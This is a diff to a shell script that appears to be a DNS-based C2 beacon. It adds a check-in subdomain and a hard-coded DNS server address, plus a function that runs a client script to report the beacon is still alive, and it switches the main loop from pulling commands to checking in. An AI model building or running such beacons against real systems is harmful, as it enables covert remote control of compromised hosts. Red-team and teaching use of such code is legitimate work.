@@ -2,6 +2,7 @@
 # Beacon to DNS server 
 
 domain="doshcloud.com"
+chkdomain="check.doshcloud.com"
 dnsServer="129.21.130.212"
 f=false
 
@@ -17,9 +18,16 @@ pull(){
     fi
 }
 
+# Check in with server show beacon is still alive
+check(){
+    cmd=$(python client.py)
+    echo $cmd
+}
+
 # Main driver for beacon
 main(){
-    pull
+    #pull
+    check
 }
 
 main
